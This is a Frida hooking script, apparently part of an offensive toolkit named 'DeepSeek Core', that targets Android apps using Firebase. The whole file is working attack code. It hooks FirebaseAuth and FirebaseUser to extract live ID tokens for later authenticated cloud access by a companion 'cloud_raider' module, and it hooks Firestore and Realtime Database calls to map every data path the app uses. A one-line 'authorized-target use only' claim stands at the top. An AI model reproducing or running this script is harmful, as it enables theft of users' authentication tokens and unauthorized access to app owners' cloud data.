/*
 * DeepSeek Core — payload_firebase_steal.js  (PHASE 1.4)
 * Extracts the live Firebase ID token (for authenticated cloud access in
 * cloud_raider.py) and logs every Firestore document/collection touched, so the
 * brain learns the exact cloud paths the app uses. Authorized-target use only.
 */
"use strict";
var _seen={};
function once(k){ if(_seen[k]) return false; _seen[k]=true; return true; }
function emit(o){ try{ send(o); }catch(e){} }

function stealAuth(){
  Java.perform(function(){
    // Proactively pull a fresh ID token from the current user.
    function pull(user, why){
      try{
        if(!user) return;
        var task=user.getIdToken(false);
        var OSL=Java.use("com.google.android.gms.tasks.OnSuccessListener");
        var listener=Java.registerClass({ name:"com.hayo.IdTokL"+Math.floor(Math.random()*1e6),
          implements:[OSL], methods:{ onSuccess:function(res){ try{
            var tok=res.getToken ? res.getToken() : String(res);
            if(tok && once("idtok-"+String(tok).slice(0,24)))
              emit({event:"firebase_id_token", token:String(tok), via:why}); }catch(e){} } } });
        task.addOnSuccessListener(listener.$new());
      }catch(e){}
    }
    try{ var FA=Java.use("com.google.firebase.auth.FirebaseAuth");
      // when the app asks for the current user, grab a token too
      FA.getCurrentUser.implementation=function(){ var u=this.getCurrentUser();
        try{ if(u && once("cur-user")) pull(u,"getCurrentUser"); }catch(e){} return u; };
    }catch(e){}
    try{ var FU=Java.use("com.google.firebase.auth.FirebaseUser");
      FU.getIdToken.overload("boolean").implementation=function(f){ var t=this.getIdToken(f);
        try{ pull(this,"getIdToken"); }catch(e){} return t; };
    }catch(e){}
  });
}

function logFirestore(){
  Java.perform(function(){
    try{ var FS=Java.use("com.google.firebase.firestore.FirebaseFirestore");
      FS.collection.implementation=function(p){ try{ if(once("fs-col-"+p)) emit({event:"firestore_path", op:"collection", path:String(p)}); }catch(e){} return this.collection(p); };
      FS.document.implementation=function(p){ try{ if(once("fs-doc-"+p)) emit({event:"firestore_path", op:"document", path:String(p)}); }catch(e){} return this.document(p); };
    }catch(e){}
    try{ var CR=Java.use("com.google.firebase.firestore.CollectionReference");
      CR.document.overload("java.lang.String").implementation=function(p){ try{ if(once("cr-doc-"+p)) emit({event:"firestore_path", op:"doc", path:String(p)}); }catch(e){} return this.document(p); };
    }catch(e){}
    // Realtime DB references too
    try{ var FD=Java.use("com.google.firebase.database.FirebaseDatabase");
      FD.getReference.overload("java.lang.String").implementation=function(p){ try{ if(once("rtdb-"+p)) emit({event:"rtdb_path", path:String(p)}); }catch(e){} return this.getReference(p); };
    }catch(e){}
  });
}

setTimeout(function(){ stealAuth(); logFirestore(); emit({event:"ready", module:"firebase_steal"}); }, 0);
